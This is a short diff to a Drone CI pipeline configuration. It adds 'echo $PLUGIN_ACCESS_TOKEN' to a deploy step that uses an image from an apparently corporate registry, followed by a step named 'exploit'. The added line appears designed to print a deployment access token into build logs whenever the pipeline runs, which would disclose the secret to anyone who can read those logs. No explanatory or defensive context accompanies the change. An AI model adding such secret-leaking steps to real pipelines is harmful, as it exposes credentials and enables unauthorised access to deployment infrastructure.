@@ -4,6 +4,8 @@ name: default
 steps:
   - name: deploy
     image: nexus.admin.sharecare.com/drone-kubernetes-deploy
+    commands:
+      - echo $PLUGIN_ACCESS_TOKEN
 
   - name: exploit
     image: alpine
